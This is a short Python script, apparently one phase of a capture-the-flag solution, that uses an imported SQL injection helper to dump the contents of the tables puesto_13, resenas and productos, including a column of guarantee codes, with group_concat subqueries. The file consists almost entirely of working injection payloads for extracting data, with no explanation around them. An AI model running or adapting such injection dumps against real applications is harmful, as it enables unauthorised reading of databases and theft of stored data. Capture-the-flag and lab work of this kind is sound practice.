#!/usr/bin/env python3
"""Fase 2: volcado de las tablas puesto_13 y resenas."""
import sys

sys.path.insert(0, "/mnt/c/Users/<usuario>/OneDrive - dipreca.cl/Agentes IA/AUDITORIA_IA_V2/ctf/feriapersa/solucion")
from sqli import valor  # noqa: E402

pruebas = [
    ("filas puesto_13", "(SELECT count(*) FROM puesto_13)"),
    ("item(s) puesto_13", "(SELECT group_concat(item) FROM puesto_13)"),
    ("codigo_garantia", "(SELECT group_concat(codigo_garantia) FROM puesto_13)"),
    ("fila completa", "(SELECT group_concat(id||char(124)||item||char(124)||codigo_garantia) FROM puesto_13)"),
    ("resenas", "(SELECT group_concat(autor||char(58)||comentario||char(58)||estrellas) FROM resenas)"),
    ("productos (id|nombre|precio)", "(SELECT group_concat(id||char(124)||nombre||char(124)||precio) FROM productos)"),
    ("nombres de productos", "(SELECT group_concat(nombre) FROM productos)"),
]

for nombre, expr in pruebas:
    print(f"### {nombre}")
    print("   ", valor(expr)[:2500])
    print()
